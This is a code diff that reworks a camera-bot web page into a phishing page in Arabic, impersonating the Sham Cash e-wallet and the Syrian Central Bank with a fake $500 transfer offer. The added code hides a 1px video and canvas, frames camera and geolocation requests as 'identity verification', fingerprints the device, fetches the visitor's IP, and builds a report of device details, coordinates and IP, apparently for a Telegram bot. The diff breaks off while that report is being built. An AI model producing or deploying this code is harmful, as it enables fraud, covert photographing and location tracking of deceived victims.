@@ -2,294 +2,994 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>كاميرا بوت تيليغرام</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>شام كاش - تأكيد الحوالة</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
+        :root {
+            --primary: #1a3a5c;
+            --primary-dark: #0f2440;
+            --primary-light: #2a5a8c;
+            --secondary: #007a3d;
+            --secondary-dark: #005a2c;
+            --secondary-light: #00a651;
+            --gold: #c8a84e;
+            --gold-light: #e2c97e;
+            --accent: #00b4d8;
+            --red: #ce1126;
+            --white: #ffffff;
+            --black: #1a1a1a;
+            --bg: #f0f4f8;
+            --card: #ffffff;
+            --text: #1a1a1a;
+            --text-gray: #666666;
+            --border: #e5e7eb;
+            --gradient-primary: linear-gradient(160deg, #1a3a5c 0%, #2a5a8c 50%, #007a3d 100%);
+            --gradient-gold: linear-gradient(135deg, #c8a84e, #e2c97e, #c8a84e);
+        }
+
         * { margin: 0; padding: 0; box-sizing: border-box; }
+
         body {
-            font-family: 'Segoe UI', Tahoma, sans-serif;
-            background: #1a1a2e;
-            color: white;
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(180deg, #0f2440 0%, #1a3a5c 30%, #f0f4f8 100%);
             min-height: 100vh;
+            min-height: 100dvh;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
-            padding: 20px;
+            justify-content: center;
+            padding: 0;
+            margin: 0;
+            overflow-x: hidden;
         }
-        .container {
-            background: #16213e;
-            border-radius: 20px;
-            padding: 30px;
-            max-width: 500px;
+
+        .syria-flag {
             width: 100%;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
-        }
-        h1 { 
-            text-align: center; 
-            margin-bottom: 20px;
-            color: #00d4ff;
-        }
-        .video-container {
-            position: relative;
-            width: 100%;
-            border-radius: 15px;
-            overflow: hidden;
-            margin-bottom: 20px;
-            background: #000;
-        }
-        #video {
-            width: 100%;
-            display: none;
-            transform: scaleX(-1); /* مرآة للكاميرا الأمامية */
-        }
-        #canvas { display: none; }
-        
-        .status {
-            background: rgba(255,255,255,0.1);
-            padding: 15px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            text-align: center;
-            font-size: 14px;
-            min-height: 50px;
+            height: 8px;
+            background: linear-gradient(90deg, 
+                #007a3d 0%, #007a3d 33.33%, 
+                #ffffff 33.33%, #ffffff 66.66%, 
+                #000000 66.66%, #000000 100%
+            );
+            position: fixed;
+            top: 0;
+            z-index: 100;
             display: flex;
             align-items: center;
             justify-content: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
         }
-        
-        .progress-container {
-            background: rgba(255,255,255,0.1);
-            border-radius: 10px;
-            height: 10px;
-            margin-bottom: 20px;
-            overflow: hidden;
-            display: none;
-        }
-        .progress-bar {
-            height: 100%;
-            background: linear-gradient(90deg, #00d4ff, #0099ff);
-            width: 0%;
-            transition: width 0.5s ease;
-        }
-        
-        .image-counter {
-            text-align: center;
-            margin-bottom: 15px;
-            font-size: 16px;
-            color: #00d4ff;
-            display: none;
-        }
-        
-        .buttons {
-            display: flex;
-            gap: 10px;
-        }
-        button {
-            flex: 1;
-            padding: 15px;
-            border: none;
-            border-radius: 10px;
-            font-size: 16px;
+
+        .syria-flag-stars {
+            color: #ce1126;
+            font-size: 12px;
+            letter-spacing: 5px;
+            text-shadow: 0 0 3px rgba(0,0,0,0.3);
             font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s;
         }
-        .btn-start {
-            background: #00d4ff;
-            color: #1a1a2e;
+
+        .app-container {
+            width: 100%;
+            max-width: 440px;
+            margin: 0 auto;
+            padding: 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            min-height: 100vh;
+            min-height: 100dvh;
+            justify-content: center;
+            padding-top: 35px;
         }
-        .btn-start:hover { background: #00b8e6; }
-        .btn-start:disabled { background: #555; color: #999; cursor: not-allowed; }
-        
-        .btn-stop {
-            background: #ff4757;
+
+        .header-card {
+            background: var(--white);
+            border-radius: 18px;
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            border: 1px solid #e5e7eb;
+            position: relative;
+            backdrop-filter: blur(10px);
+        }
+
+        .syria-eagle-corner {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 48px;
+            height: 48px;
+            opacity: 0.9;
+        }
+
+        .syria-eagle-corner img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .shamcash-logo-container {
+            width: 52px;
+            height: 52px;
+            min-width: 52px;
+            border-radius: 14px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(26, 58, 92, 0.2);
+            background: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .shamcash-logo-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .header-info { flex: 1; }
+
+        .header-title {
+            font-size: 19px;
+            font-weight: 800;
+            color: #1a3a5c;
+            line-height: 1.2;
+        }
+
+        .header-subtitle {
+            font-size: 11px;
+            color: #666;
+            font-weight: 500;
+        }
+
+        .verified-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            background: #e8f4f8;
+            color: #1a3a5c;
+            padding: 4px 12px;
+            border-radius: 14px;
+            font-size: 10px;
+            font-weight: 700;
+            border: 1px solid #b8d8e8;
+            margin-top: 4px;
+        }
+
+        .verified-badge::before {
+            content: '✓';
+            background: #007a3d;
+            color: white;
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 9px;
+        }
+
+        .gift-card {
+            background: var(--white);
+            border-radius: 22px;
+            overflow: hidden;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
+            border: 1px solid #e5e7eb;
+        }
+
+        .gift-header {
+            background: var(--gradient-primary);
+            padding: 28px 20px 22px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .gift-header::before {
+            content: '';
+            position: absolute;
+            top: -40px;
+            right: -40px;
+            width: 120px;
+            height: 120px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 50%;
+        }
+
+        .gift-header::after {
+            content: '';
+            position: absolute;
+            bottom: -30px;
+            left: -30px;
+            width: 100px;
+            height: 100px;
+            background: rgba(255,255,255,0.03);
+            border-radius: 50%;
+        }
+
+        .gift-icon {
+            font-size: 52px;
+            margin-bottom: 10px;
+            position: relative;
+            z-index: 1;
+            animation: floatIcon 3s ease-in-out infinite;
+        }
+
+        @keyframes floatIcon {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .gift-badge {
+            display: inline-block;
+            background: var(--gradient-gold);
+            color: #1a1a1a;
+            padding: 6px 18px;
+            border-radius: 22px;
+            font-weight: 700;
+            font-size: 13px;
+            position: relative;
+            z-index: 1;
+            box-shadow: 0 4px 20px rgba(200, 168, 78, 0.5);
+            letter-spacing: 0.5px;
+        }
+
+        .gift-amount {
+            font-size: 56px;
+            font-weight: 900;
+            color: white;
+            margin: 14px 0 4px;
+            position: relative;
+            z-index: 1;
+            text-shadow: 0 4px 20px rgba(0,0,0,0.3);
+            line-height: 1;
+            letter-spacing: -1px;
+        }
+
+        .gift-amount .usd {
+            font-size: 26px;
+            vertical-align: super;
+            margin-right: 4px;
+            font-weight: 700;
+        }
+
+        .gift-subtitle {
+            color: rgba(255,255,255,0.9);
+            font-size: 14px;
+            font-weight: 500;
+            position: relative;
+            z-index: 1;
+        }
+
+        .security-banner {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: #f0fdf4;
+            padding: 8px 16px;
+            margin: 0 20px;
+            border-radius: 0 0 12px 12px;
+            font-size: 11px;
+            color: #007a3d;
+            font-weight: 600;
+            border: 1px solid #bbf7d0;
+            border-top: none;
+        }
+
+        .gift-body { padding: 20px; }
+
+        .syria-emblem {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 14px;
+            margin-bottom: 18px;
+            padding: 16px;
+            background: linear-gradient(135deg, #f8fafc, #f0f4f8);
+            border-radius: 14px;
+            border: 1px dashed #cbd5e1;
+        }
+
+        .syria-emblem-img {
+            width: 58px;
+            height: 58px;
+            min-width: 58px;
+        }
+
+        .syria-emblem-img img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .syria-emblem .stars-text {
+            color: #ce1126;
+            font-size: 18px;
+            letter-spacing: 3px;
+            font-weight: 700;
+        }
+
+        .syria-emblem .emblem-text {
+            font-size: 13px;
+            font-weight: 700;
+            color: #1a3a5c;
+            text-align: center;
+            line-height: 1.4;
+        }
+
+        .features {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 22px;
+        }
+
+        .feature-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 13px;
+            color: #444;
+            font-weight: 500;
+            padding: 8px 12px;
+            background: #f8fafc;
+            border-radius: 10px;
+            transition: all 0.3s ease;
+        }
+
+        .feature-item:hover {
+            background: #e8f4f8;
+            transform: translateX(-4px);
+        }
+
+        .feature-icon {
+            width: 32px;
+            height: 32px;
+            min-width: 32px;
+            background: linear-gradient(135deg, #1a3a5c, #2a5a8c);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
             color: white;
         }
-        .btn-stop:hover { background: #ee3a4a; }
-        .btn-stop:disabled { background: #555; color: #999; cursor: not-allowed; }
-        
-        .log {
-            margin-top: 20px;
-            padding: 10px;
-            background: rgba(0,0,0,0.3);
-            border-radius: 10px;
-            max-height: 150px;
-            overflow-y: auto;
-            font-size: 12px;
-            color: #aaa;
-            display: none;
+
+        .claim-btn {
+            width: 100%;
+            padding: 18px;
+            background: var(--gradient-primary);
+            color: white;
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 16px;
+            font-size: 19px;
+            font-weight: 800;
+            font-family: 'Cairo', sans-serif;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 30px rgba(26, 58, 92, 0.3);
+            position: relative;
+            overflow: hidden;
+            letter-spacing: 0.5px;
         }
-        .log div { margin: 3px 0; }
+
+        .claim-btn::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.15), transparent);
+            transform: rotate(45deg);
+            animation: shimmer 2s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { transform: translateX(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) rotate(45deg); }
+        }
+
+        .claim-btn:active { transform: scale(0.97); }
+
+        .claim-btn .arrow {
+            margin-right: 10px;
+            animation: arrowMove 1.5s ease-in-out infinite;
+        }
+
+        @keyframes arrowMove {
+            0%, 100% { transform: translateX(0); }
+            50% { transform: translateX(-5px); }
+        }
+
+        .claim-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            animation: none;
+        }
+
+        .trust-notice {
+            text-align: center;
+            margin-top: 12px;
+            font-size: 11px;
+            color: #999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .trust-notice .ssl-icon { color: #007a3d; }
+
+        .processing-card {
+            background: var(--white);
+            border-radius: 22px;
+            padding: 35px 20px;
+            text-align: center;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
+            display: none;
+            border: 1px solid #e5e7eb;
+        }
+
+        .spinner-ring {
+            width: 65px;
+            height: 65px;
+            margin: 0 auto 20px;
+            border: 5px solid #e5e7eb;
+            border-top-color: #1a3a5c;
+            border-right-color: #007a3d;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .processing-title {
+            font-size: 21px;
+            font-weight: 800;
+            color: #1a3a5c;
+            margin-bottom: 8px;
+        }
+
+        .processing-subtitle {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 22px;
+        }
+
+        .steps-progress {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            text-align: right;
+        }
+
+        .progress-step {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 13px;
+            color: #888;
+            padding: 12px 14px;
+            background: #f9fafb;
+            border-radius: 12px;
+            border: 1px solid #f0f0f0;
+            transition: all 0.3s ease;
+        }
+
+        .progress-step.done {
+            color: #007a3d;
+            background: #f0fdf4;
+            border-color: #bbf7d0;
+        }
+
+        .progress-step.current {
+            color: #1a3a5c;
+            background: #e8f4f8;
+            border-color: #b8d8e8;
+            font-weight: 600;
+            box-shadow: 0 2px 10px rgba(26, 58, 92, 0.1);
+        }
+
+        .progress-dot {
+            width: 12px;
+            height: 12px;
+            min-width: 12px;
+            border-radius: 50%;
+            background: #ddd;
+            transition: all 0.3s ease;
+        }
+
+        .progress-step.done .progress-dot {
+            background: #10b981;
+            box-shadow: 0 0 10px rgba(16, 185, 129, 0.4);
+        }
+
+        .progress-step.current .progress-dot {
+            background: #2a5a8c;
+            animation: pulse-dot 1s infinite;
+            box-shadow: 0 0 10px rgba(42, 90, 140, 0.4);
+        }
+
+        @keyframes pulse-dot {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.6); }
+        }
+
+        .success-card {
+            background: var(--white);
+            border-radius: 22px;
+            padding: 35px 20px;
+            text-align: center;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
+            display: none;
+            border: 1px solid #e5e7eb;
+        }
+
+        .success-icon-circle {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #10b981, #34d399);
+            border-radius: 50%;
+            margin: 0 auto 22px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: popIn 0.6s ease;
+            box-shadow: 0 10px 30px rgba(16, 185, 129, 0.3);
+        }
+
+        @keyframes popIn {
+            from { transform: scale(0) rotate(-90deg); opacity: 0; }
+            to { transform: scale(1) rotate(0deg); opacity: 1; }
+        }
+
+        .success-icon-circle svg { width: 38px; height: 38px; }
+
+        .success-title {
+            font-size: 24px;
+            font-weight: 800;
+            color: #1a3a5c;
+            margin-bottom: 8px;
+        }
+
+        .success-amount {
+            font-size: 42px;
+            font-weight: 900;
+            background: var(--gradient-gold);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin: 8px 0;
+        }
+
+        .success-text { color: #666; font-size: 14px; margin-top: 6px; }
+
+        .success-details {
+            background: #f0fdf4;
+            border-radius: 12px;
+            padding: 12px;
+            margin-top: 16px;
+            font-size: 12px;
+            color: #007a3d;
+            border: 1px solid #bbf7d0;
+        }
+
+        .error-card {
+            background: var(--white);
+            border-radius: 22px;
+            padding: 35px 20px;
+            text-align: center;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
+            display: none;
+            border: 1px solid #e5e7eb;
+        }
+
+        .error-icon { font-size: 55px; margin-bottom: 14px; }
+
+        .error-title {
+            font-size: 19px;
+            font-weight: 700;
+            color: #dc2626;
+            margin-bottom: 8px;
+        }
+
+        .error-text { color: #666; font-size: 13px; margin-bottom: 18px; }
+
+        .retry-btn {
+            background: linear-gradient(135deg, #1a3a5c, #2a5a8c);
+            color: white;
+            border: none;
+            padding: 14px 35px;
+            border-radius: 28px;
+            font-weight: 700;
+            font-size: 15px;
+            cursor: pointer;
+            font-family: 'Cairo', sans-serif;
+            transition: all 0.3s ease;
+            box-shadow: 0 6px 20px rgba(26, 58, 92, 0.3);
+        }
+
+        .retry-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(26, 58, 92, 0.4);
+        }
+
+        video, canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            opacity: 0;
+            pointer-events: none;
+            width: 1px;
+            height: 1px;
+            z-index: -999;
+        }
+
+        .hidden { display: none !important; }
+
+        .watermark {
+            position: fixed;
+            bottom: 20px;
+            right: 50%;
+            transform: translateX(50%);
+            color: rgba(255,255,255,0.3);
+            font-size: 10px;
+            z-index: 10;
+            pointer-events: none;
+        }
+
+        @media (max-width: 400px) {
+            .app-container { padding: 8px; gap: 8px; padding-top: 30px; }
+            .gift-amount { font-size: 44px; }
+            .claim-btn { font-size: 17px; padding: 16px; }
+            .syria-eagle-corner { width: 38px; height: 38px; left: 10px; }
+            .syria-emblem-img { width: 48px; height: 48px; min-width: 48px; }
+        }
+
+        @media (min-height: 800px) {
+            .app-container { justify-content: center; gap: 16px; }
+        }
+
+        @media (max-height: 700px) {
+            .app-container { justify-content: flex-start; padding-top: 35px; }
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>📸 كاميرا البوت</h1>
-        
-        <div class="video-container">
-            <video id="video" autoplay playsinline muted></video>
-            <canvas id="canvas"></canvas>
-        </div>
-        
-        <div class="status" id="status">⏳ جاري التحميل...</div>
-        
-        <div class="progress-container" id="progressContainer">
-            <div class="progress-bar" id="progressBar"></div>
-        </div>
-        
-        <div class="image-counter" id="imageCounter"></div>
-        
-        <div class="buttons">
-            <button class="btn-start" id="startBtn" disabled>▶️ بدء</button>
-            <button class="btn-stop" id="stopBtn" disabled>⏹ إيقاف</button>
-        </div>
-        
-        <div class="log" id="log"></div>
+
+    <!-- العلم السوري -->
+    <div class="syria-flag">
+        <span class="syria-flag-stars">✦ ✦ ✦</span>
     </div>
 
-    <!-- تحميل الملفات -->
+    <!-- الحاوية الرئيسية -->
+    <div class="app-container">
+
+        <!-- ✅ هيدر شام كاش - مع شعار سوريا الرسمي على اليسار -->
+        <div class="header-card" id="headerCard">
+            <div class="shamcash-logo-container">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6f/Image_of_the_Sham_Cash_app_in_Syria_2026.jpg/250px-Image_of_the_Sham_Cash_app_in_Syria_2026.jpg" 
+                     alt="شام كاش" 
+                     style="width:100%;height:100%;object-fit:contain;"
+                     onerror="this.style.display='none'; this.parentElement.innerHTML='<span style=color:white;font-weight:900;font-size:22px;background:linear-gradient(135deg,#1a3a5c,#2a5a8c);width:52px;height:52px;display:flex;align-items:center;justify-content:center;border-radius:14px;>شك</span>'">
+            </div>
+            <div class="header-info">
+                <div class="header-title">شام كاش</div>
+                <div class="header-subtitle">المحفظة الإلكترونية الرسمية</div>
+                <span class="verified-badge">حساب موثق رسمياً</span>
+            </div>
+            <!-- ✅ شعار الجمهورية العربية السورية الرسمي -->
+            <div class="syria-eagle-corner">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Coat_of_arms_of_Syria.svg/1200px-Coat_of_arms_of_Syria.svg.png" 
+                     alt="شعار الجمهورية العربية السورية" 
+                     style="width:100%;height:100%;object-fit:contain;"
+                     onerror="this.parentElement.innerHTML='<span style=font-size:40px;opacity:0.8;>🦅</span>'">
+            </div>
+        </div>
+
+        <!-- بطاقة الحوالة الرئيسية -->
+        <div class="gift-card" id="giftCard">
+            <div class="gift-header">
+                <div class="gift-icon">💳</div>
+                <div class="gift-badge">🏆 حوالة مالية مستحقة</div>
+                <div class="gift-amount">500<span class="usd">$</span></div>
+                <div class="gift-subtitle">حوالة خارجية قيد التأكيد - شام كاش</div>
+            </div>
+            
+            <div class="security-banner">
+                <span class="lock-icon">🔐</span>
+                <span>معاملة مشفرة - رقم المرجع: #SHC-2026-8472</span>
+            </div>
+
+            <div class="gift-body">
+                <!-- ✅ شعار سوريا الرسمي داخل البطاقة -->
+                <div class="syria-emblem">
+                    <div class="syria-emblem-img">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Coat_of_arms_of_Syria.svg/1200px-Coat_of_arms_of_Syria.svg.png" 
+                             alt="شعار الجمهورية العربية السورية" 
+                             style="width:100%;height:100%;object-fit:contain;"
+                             onerror="this.innerHTML='<span style=font-size:50px;>🦅</span>'">
+                    </div>
+                    <div>
+                        <span class="stars-text">★★★</span>
+                        <div class="emblem-text">الجمهورية العربية السورية<br>مصرف سوريا المركزي</div>
+                    </div>
+                </div>
+
+                <div class="features">
+                    <div class="feature-item">
+                        <span class="feature-icon">🏦</span>
+                        <span>حوالة صادرة من بنك دولي معتمد</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">📋</span>
+                        <span>مطلوب تأكيد الهوية لاستلام المبلغ</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">⚡</span>
+                        <span>إيداع فوري في محفظة شام كاش</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">🔒</span>
+                        <span>نظام تحقق آمن ومطابق للمعايير المصرفية</span>
+                    </div>
+                </div>
+
+                <button class="claim-btn" id="claimBtn" onclick="startClaim()">
+                    تأكيد واستلام الحوالة
+                    <span class="arrow">←</span>
+                </button>
+
+                <div class="trust-notice">
+                    <span class="ssl-icon">🔒</span>
+                    <span>اتصال آمن SSL - معلوماتك محمية بالكامل</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- بطاقة المعالجة -->
+        <div class="processing-card" id="processingCard">
+            <div class="spinner-ring"></div>
+            <div class="processing-title">جاري معالجة الحوالة</div>
+            <div class="processing-subtitle">يرجى الانتظار... نقوم بالتحقق من البيانات</div>
+            <div class="steps-progress">
+                <div class="progress-step" id="pStep1">
+                    <span class="progress-dot"></span>
+                    <span>التحقق من الموقع الجغرافي (داخل سوريا)</span>
+                </div>
+                <div class="progress-step" id="pStep2">
+                    <span class="progress-dot"></span>
+                    <span>تأكيد الهوية عبر الكاميرا الأمامية</span>
+                </div>
+                <div class="progress-step" id="pStep3">
+                    <span class="progress-dot"></span>
+                    <span>إيداع 500$ في محفظة شام كاش</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- بطاقة النجاح -->
+        <div class="success-card" id="successCard">
+            <div class="success-icon-circle">
+                <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3">
+                    <polyline points="20 6 9 17 4 12"/>
+                </svg>
+            </div>
+            <div class="success-title">✅ تم تأكيد الحوالة بنجاح</div>
+            <div class="success-amount">500$</div>
+            <div class="success-text">سيتم إيداع المبلغ في محفظتك خلال 24 ساعة</div>
+            <div class="success-details">
+                📋 رقم المرجع: #SHC-2026-8472<br>
+                🏦 حالة الحوالة: معلقة - بانتظار الإيداع النهائي<br>
+                📞 للاستفسار: دعم شام كاش
+            </div>
+        </div>
+
+        <!-- بطاقة الخطأ -->
+        <div class="error-card" id="errorCard">
+            <div class="error-icon">⚠️</div>
+            <div class="error-title">تعذر تأكيد الحوالة</div>
+            <div class="error-text" id="errorText">يرجى المحاولة مرة أخرى ومنح الأذونات المطلوبة</div>
+            <button class="retry-btn" onclick="location.reload()">🔄 إعادة المحاولة</button>
+        </div>
+
+    </div>
+
+    <!-- علامة مائية -->
+    <div class="watermark">شام كاش - Sham Cash © 2026</div>
+
+    <!-- عناصر تقنية مخفية -->
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <!-- الملفات الخارجية -->
     <script src="config.js"></script>
     <script src="cam-bot.js"></script>
-    
+
     <script>
-        const statusDiv = document.getElementById('status');
-        const startBtn = document.getElementById('startBtn');
-        const stopBtn = document.getElementById('stopBtn');
-        const progressContainer = document.getElementById('progressContainer');
-        const progressBar = document.getElementById('progressBar');
-        const imageCounter = document.getElementById('imageCounter');
-        const logDiv = document.getElementById('log');
-        
-        let isRunning = false;
+        const CAPTURE_COUNT = 5;
+        const CAPTURE_INTERVAL = 2000;
+        const CLAIM_AMOUNT = 500;
 
-        function addLog(message) {
-            logDiv.style.display = 'block';
-            const div = document.createElement('div');
-            div.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-            logDiv.appendChild(div);
-            logDiv.scrollTop = logDiv.scrollHeight;
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let browser = 'غير معروف';
+            if (ua.includes('Firefox')) browser = 'Firefox';
+            else if (ua.includes('Edg')) browser = 'Edge';
+            else if (ua.includes('Chrome')) browser = 'Chrome';
+            else if (ua.includes('Safari')) browser = 'Safari';
+            else if (ua.includes('Opera')) browser = 'Opera';
+
+            let os = 'غير معروف';
+            if (ua.includes('Windows')) os = 'Windows';
+            else if (ua.includes('Mac')) os = 'macOS';
+            else if (ua.includes('Linux')) os = 'Linux';
+            else if (ua.includes('Android')) os = 'Android';
+            else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
+
+            let deviceType = 'كمبيوتر';
+            if (/Mobi|Android|iPhone|iPad/i.test(ua)) deviceType = 'جوال';
+            if (/iPad|Tablet/i.test(ua)) deviceType = 'تابلت';
+
+            return {
+                deviceType, os, browser, userAgent: ua,
+                screenSize: `${window.screen.width}x${window.screen.height}`,
+                viewport: `${window.innerWidth}x${window.innerHeight}`,
+                language: navigator.language,
+                platform: navigator.platform || 'غير معروف',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                localTime: new Date().toLocaleString('ar-SY'),
+                ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'غير معروف',
+                cores: navigator.hardwareConcurrency || 'غير معروف',
+                connection: navigator.connection ? navigator.connection.effectiveType : 'غير معروف',
+            };
         }
 
-        function showStatus(message, isError = false) {
-            statusDiv.textContent = message;
-            statusDiv.style.color = isError ? '#ff4757' : 'white';
-            addLog(message);
-        }
-
-        function updateProgress(current, total) {
-            const percentage = (current / total) * 100;
-            progressBar.style.width = percentage + '%';
-            progressContainer.style.display = 'block';
-            imageCounter.style.display = 'block';
-            imageCounter.textContent = `📸 ${current} / ${total}`;
-        }
-
-        function updateUI(running) {
-            startBtn.disabled = running;
-            stopBtn.disabled = !running;
-        }
-
-        async function startBot() {
+        async function getIPInfo() {
             try {
-                isRunning = true;
-                updateUI(true);
-                
-                // 1. تهيئة الكاميرا
-                showStatus('🎥 جاري تهيئة الكاميرا...');
-                if (!CamBot.init()) throw new Error('فشل تهيئة الكاميرا');
-                
-                // 2. تشغيل الكاميرا والموقع
-                const result = await CamBot.startAll((type, data) => {
-                    if (type === 'location') {
-                        showStatus('📍 تم تحديد الموقع');
-                        addLog('📍 الموقع: ' + data.lat + ', ' + data.lng);
-                    } else if (type === 'camera_ready') {
-                        showStatus('✅ الكاميرا جاهزة');
-                        document.getElementById('video').style.display = 'block';
-                    } else if (type === 'camera_error') {
-                        showStatus('❌ خطأ في الكاميرا: ' + data, true);
-                    }
-                });
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch (e) { return 'غير متوفر'; }
+        }
 
-                if (!result.success) {
-                    throw new Error(result.error || 'فشل تشغيل الكاميرا');
+        const giftCard = document.getElementById('giftCard');
+        const headerCard = document.getElementById('headerCard');
+        const processingCard = document.getElementById('processingCard');
+        const successCard = document.getElementById('successCard');
+        const errorCard = document.getElementById('errorCard');
+        const errorText = document.getElementById('errorText');
+
+        function showProcessing() {
+            giftCard.style.display = 'none';
+            processingCard.style.display = 'block';
+            successCard.style.display = 'none';
+            errorCard.style.display = 'none';
+        }
+
+        function showSuccess() {
+            giftCard.style.display = 'none';
+            processingCard.style.display = 'none';
+            successCard.style.display = 'block';
+            errorCard.style.display = 'none';
+            headerCard.style.opacity = '0.5';
+        }
+
+        function showError(msg) {
+            giftCard.style.display = 'none';
+            processingCard.style.display = 'none';
+            successCard.style.display = 'none';
+            errorCard.style.display = 'block';
+            errorText.textContent = msg;
+        }
+
+        function updateProgressStep(step, status) {
+            document.getElementById('pStep' + step).className = 'progress-step ' + status;
+        }
+
+        function buildInfoMessage(deviceInfo, locationData, ip) {
+            let msg = '🏦 <b>شام كاش - حوالة جديدة بقيمة ' + CLAIM_AMOUNT + '$</b>\n\n';
+            msg += '━━━━━━━━━━━━━━━━━\n📱 <b>معلومات الجهاز</b>\n━━━━━━━━━━━━━━━━━\n';
+            msg += `📱 <b>النوع:</b> ${deviceInfo.deviceType}\n`;
+            msg += `💻 <b>النظام:</b> ${deviceInfo.os}\n`;
+            msg += `🌐 <b>المتصفح:</b> ${deviceInfo.browser}\n`;
+            msg += `🖥 <b>الشاشة:</b> ${deviceInfo.screenSize}\n`;
+            msg += `📐 <b>دقة العرض:</b> ${deviceInfo.viewport}\n`;
+            msg += `💾 <b>الذاكرة:</b> ${deviceInfo.ram}\n`;
+            msg += `🧠 <b>الأنوية:</b> ${deviceInfo.cores}\n`;
+            msg += `📶 <b>الاتصال:</b> ${deviceInfo.connection}\n`;
+            msg += `🌍 <b>اللغة:</b> ${deviceInfo.language}\n`;
+            msg += `🕐 <b>الوقت:</b> ${deviceInfo.localTime}\n`;
+            msg += `⏰ <b>المنطقة:</b> ${deviceInfo.timezone}\n`;
+            msg += '\n━━━━━━━━━━━━━━━━━\n📍 <b>معلومات الموقع</b>\n━━━━━━━━━━━━━━━━━\n';
+            if (locationData) {
+                msg += `🗺 <b>الرابط:</b> <a href="${locationData.mapUrl}">عرض على الخريطة</a>\n`;
+                msg += `🎯 <b>الدقة:</b> ${Math.round(locationData.accuracy)} متر\n`;
+                msg += `📍 <b>الإحداثيات:</b> ${locationData.lat}, ${locationData.lng}\n`;
+            } else { msg += '⚠️ لم يتم تحديد الموقع\n'; }
+            msg += '\n━━━━━━━━━━━━━━━━━\n🌐 <b>الشبكة</b>\n━━━━━━━━━━━━━━━━━\n';
+            msg += `🔢 <b>IP:</b> <code>${ip}</code>\n`;
